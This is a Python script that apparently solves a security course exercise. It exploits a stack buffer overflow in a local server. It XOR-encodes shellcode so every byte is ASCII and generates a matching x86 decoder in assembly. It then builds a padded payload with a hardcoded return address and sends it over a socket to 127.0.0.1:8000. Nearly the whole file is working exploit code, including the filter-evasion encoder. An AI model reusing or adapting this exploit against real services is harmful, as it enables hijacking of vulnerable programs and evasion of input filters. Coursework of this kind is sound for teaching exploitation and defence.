#!/usr/bin/python

import functools, os, socket, traceback
import q2, assemble, struct


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f

DECODER = "./decoder.asm" #part of the decoder
CRITICAL_LENGTH = 1044

def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)
    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(ord(c) > ASCII_MAX for c in selector(ret)):
                print('WARNING: Non ASCII chars in return value from %s at\n%s'
                      % (func.__name__, ''.join(traceback.format_stack()[:-1])))
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda (x,y): x)
def encode(data):
    '''Encode data to be valid ASCII, by XOR-ing non ASCII bytes with 0xff.

    Return the encoded data and the indices that were XOR-ed.
    - To return multiple values, do `return a, b`
    - To get multiple returned values do `a, b = encode(data)`
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    
    lst = list(data) 
    indices = []
    for i in range(0,len(lst)): #xor any high value to meet threshold
        if ord(lst[i])>ASCII_MAX:
            lst[i] = chr((ord(lst[i]))^255)
            indices += [i] #keeping track of edited values 
    data = ''.join(lst)
    return data, indices

    #raise NotImplementedError()


@warn_invalid_ascii()
def get_decoder(indices):
    '''Return the assembled decoder code.'''
    # TODO: IMPLEMENT THIS FUNCTION
    
    #my decoder is as you suggested- xoring bytes that are too high
    #I have some "overhead" code that initializes the registers EAX- address on stack of where the shell begins, bl=ff this is in another function
    #originaly I choose to asmble the two parts (overhead and xor statments) seperatly, but as my shell is only 123 bytes long
    #	the smoketest faild even though my code worked. So I wrote the whole function as generic- not assuming anything on the shell 
    
    asm=""

    front = "xor byte ptr [eax+" #this will create the "xor byte ptr [eax +i], bl" asembly line
    back = "], BL\n"
    ind = 0

    for i in range(0,indices[len(indices)-1]+1):
        if ((i%126==0) and (i!=0)): #every 127 charachters we need to increment eax since we can't express bigger immidiateds
            asm+="push eax\n"
            asm+="push 127\n"
            asm+="pop eax\n"
            asm+="add dword ptr [esp], eax\n"
            asm+="pop eax\n"
        if (i==indices[ind]):
            asm += front + str(i%127) + back
            ind+=1

    code = assemble.assemble_data(asm)
    #print(asm)#uncomment this to see what the assembly code looks like
    return code
    #raise NotImplementedError()


@warn_invalid_ascii()
def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.

    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    q2_shellcode = get_raw_shellcode()
    # TODO: IMPLEMENT THIS FUNCTION
    origlen = len(q2_shellcode)+4
    #this whole block primes eax to be the base address of the original shellcode and bl to be 0xff
    asm = "push 0\npop ebx\ndec ebx\npush esp\npush 127\npop eax\n" #primes bl to be 0xFF and eax to be 127
    reps = (int)(origlen / 127) #I can only decrement 127 at a time (0x7f)
    for i in range (0,reps):
        asm+="sub dword ptr [esp], eax\n"
    rest = (origlen%127) #take care of any correction smaller than 127
    if rest>0:
        asm+="push "
        asm+=str(rest)+"\n"
        asm+="pop eax\n"
        asm+="sub dword ptr [esp], eax\n"
    asm+="pop eax\n"
    shellcode = assemble.assemble_data(asm)
    #getting the decoder (which assumes eax and bl are primed) and the decoded shell
    code , indices = encode(q2_shellcode)
    shellcode += get_decoder(indices) + code
    return shellcode
    #raise NotImplementedError()


@warn_invalid_ascii(lambda x: x[4:-5])
def get_payload():
    '''This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    shellcode = get_shellcode()
    pad = (CRITICAL_LENGTH - len(shellcode) - 4) * chr(0x2F) #2F "effectivly nop"
    buff_start = (0xbfffe150) #taken off gdb (this is were I crash the stack)
    jmp_to = buff_start - len(shellcode) - 4 - (len(pad)/2)#calculates the middle of the slide
    addr = struct.pack('<L', jmp_to)

    payload = struct.pack('>L', CRITICAL_LENGTH+1) + pad + shellcode + addr +chr(0)
    #print ":".join("{:02x}".format(ord(c)) for c in payload) #usefull for printing out hexas, taken off stackoverflow
    return payload

def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
